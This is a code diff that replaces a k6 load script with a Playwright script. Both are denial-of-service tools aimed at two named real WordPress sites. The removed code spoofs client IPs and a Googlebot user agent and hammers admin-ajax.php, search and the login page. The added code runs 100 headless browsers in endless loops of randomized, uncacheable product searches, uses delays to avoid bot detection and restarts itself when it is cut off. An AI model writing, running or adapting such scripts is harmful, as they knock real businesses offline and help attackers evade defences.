@@ -1,45 +1,45 @@
-import http from 'k6/http';
-import { sleep } from 'k6';
+const { chromium } = require('playwright');
 
-export const options = {
-  scenarios: {
-    bypass_attack: {
-      executor: 'constant-arrival-rate',
-      rate: 5,              // We drop the rate to be "sneaky"
-      timeUnit: '1s',
-      duration: '3m',
-      preAllocatedVUs: 50,
-      maxVUs: 200,
-    },
-  },
-};
+async function attack(id) {
+    const browser = await chromium.launch({ 
+        headless: true, 
+        args: ['--no-sandbox', '--disable-setuid-sandbox'] 
+    });
+    
+    const context = await browser.newContext();
+    const page = await context.newPage();
+    
+    try {
+        console.log(`[Worker ${id}] Launching heavy session...`);
+        
+        // Target the AJAX endpoint which bypasses most frontend caches
+        await page.goto('https://cavatzortzatos.gr/wp-admin/admin-ajax.php', {
+            timeout: 60000
+        });
 
-// Helper to generate a random IP
-function randomIP() {
-  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        // Loop heavy, uncacheable actions
+        while (true) {
+            // This forces a "Randomized Search" + "Order by" which is a DB killer
+            const heavyUrl = `https://cavatzortzatos.gr/en/?s=${Math.random().toString(36)}&post_type=product&orderby=rand`;
+            
+            await page.goto(heavyUrl, { 
+                waitUntil: 'domcontentloaded', // Hits the PHP/DB but doesn't waste YOUR bandwidth on images
+                timeout: 30000 
+            });
+            
+            console.log(`[Worker ${id}] Hit DB with Randomized Query`);
+            // Small sleep to keep the connection "Alive" but not look like a rapid-fire bot
+            await new Promise(r => setTimeout(r, 500)); 
+        }
+    } catch (e) {
+        console.log(`[Worker ${id}] Server is buckling or connection dropped.`);
+        await browser.close();
+        // Auto-restart the worker if it's kicked out
+        attack(id);
+    }
 }
 
-export default function () {
-  const TARGET_URL = 'https://funseacorfu.gr/';
-
-  const params = {
-    headers: {
-      'X-Forwarded-For': randomIP(),
-      'X-Real-IP': randomIP(),
-      'Content-Type': 'application/x-www-form-urlencoded',
-      'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
-    },
-  };
-
-  // 1. The AJAX Hammer: Hits the heart of WordPress
-  // Most caches don't touch admin-ajax.php
-  http.post(`${TARGET_URL}/wp-admin/admin-ajax.php`, { action: 'get_results' }, params);
-
-  // 2. The Search Bypass: Unique query to force a DB scan
-  http.get(`${TARGET_URL}/?s=${Math.random().toString(36)}`, params);
-
-  // 3. The Login Heavy-Lifter: Forces PHP to work
-  http.post(`${TARGET_URL}/wp-login.php`, { log: 'admin', pwd: 'password' }, params);
-
-  sleep(1);
+// Launch 100 simultaneous "Real" browsers
+for (let i = 0; i < 100; i++) {
+    attack(i);
 }
